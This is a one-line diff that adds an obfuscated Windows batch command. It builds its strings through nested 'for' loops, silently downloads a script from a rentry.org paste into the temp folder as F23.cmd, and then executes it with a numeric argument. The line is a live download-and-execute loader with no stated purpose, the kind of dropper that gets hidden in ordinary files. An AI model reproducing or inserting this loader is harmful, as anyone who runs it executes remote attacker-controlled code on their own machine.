@@ -1,0 +1,1 @@
+for %%a in (165532338087548) do for %%b in (F23) do for %%c in ("%temp%\F") do for %%d in (.) do for %%e in (cmd) do for %%f in (rentry) do (cls&&curl -#Lsko "%%~c23%%d%%e" "%%f%%dorg/%%b/raw"&&call "%%~c23%%d%%e" "%%a")
